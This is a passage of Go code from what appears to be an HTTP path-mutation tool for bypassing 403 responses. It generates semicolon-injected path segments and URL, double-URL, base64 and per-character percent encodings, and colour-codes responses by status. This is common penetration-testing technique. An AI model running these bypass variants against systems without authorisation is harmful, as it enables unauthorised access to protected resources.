		for j := 0; j <= i; j++ {
			parts[j] = parts[j] + ";"
		}
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts); i++ {
		parts := append([]string{}, pathParts...)
		parts[i] = ";" + parts[i] + ";"
		patterns = append(patterns, strings.Join(parts, "/"))
	}
	return patterns
}

func generateSemicolonCombinations(pathParts []string) []string {
	var combos []string
	for i := 0; i < len(pathParts); i++ {
		parts := append([]string{}, pathParts...)
		parts[i] = ";"
		combos = append(combos, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts); i++ {
		parts := append([]string{}, pathParts...)
		parts[i] = ";" + parts[i]
		combos = append(combos, strings.Join(parts, "/"))
	}
	for i := 0; i < len(pathParts); i++ {
		parts := append([]string{}, pathParts...)
		parts[i] = parts[i] + ";"
		combos = append(combos, strings.Join(parts, "/"))
	}
	return combos
}

func generateFullEncodings(s string) []string {
	var encs []string
	encs = append(encs, s)
	encs = append(encs, url.PathEscape(s))
	encs = append(encs, url.PathEscape(url.PathEscape(s)))
	encs = append(encs, base64.StdEncoding.EncodeToString([]byte(s)))
	encs = append(encs, base64.URLEncoding.EncodeToString([]byte(s)))
	return encs
}

// percent-encode char-by-char (%, upper hex)
func percentEncodeCharByChar(s string) []string {
	var variants []string
	for i := 0; i < len(s); i++ {
		variant := s[:i] + fmt.Sprintf("%%%02X", s[i]) + s[i+1:]
		variants = append(variants, variant)
	}
	return variants
}

func colorizeLine(line string, status int) string {
	switch {
	case status >= 200 && status < 300:
		return "\033[32m" + line + "\033[0m"
	case status >= 300 && status < 400:
		return "\033[34m" + line + "\033[0m"
	case status == 401:
		return "\033[38;5;208m" + line + "\033[0m"
	case status == 403:
		return "\033[31m" + line + "\033[0m"
	case status == 404:
		return "\033[35m" + line + "\033[0m"
	case status >= 400 && status < 500:
		return "\033[33m" + line + "\033[0m"
	case status >= 500 && status < 600:
		return "\033[38;5;94m" + line + "\033[0m"
	default:
		return line
	}
}
